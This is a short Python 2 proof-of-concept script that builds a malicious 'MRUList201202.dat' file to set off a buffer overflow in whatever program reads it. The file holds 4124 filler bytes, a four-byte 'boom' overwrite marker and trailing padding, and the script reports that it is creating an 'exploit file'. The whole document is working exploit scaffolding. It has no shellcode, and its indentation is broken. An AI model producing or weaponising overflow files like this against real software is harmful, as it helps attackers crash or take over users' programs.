#!/usr/bin/python
file="MRUList201202.dat"

junk1="\x41" * 4124
boom="\x42\x42\x42\x42"
junk2="\x43" * 100

poc=junk1 + boom + junk2

try:
print "[*] Creating exploit file...\n"
writeFile = open (file, "w")
writeFile.write( poc )
writeFile.close()
print "[*] File successfully created!"
except:
print "[!] Error while creating file!"

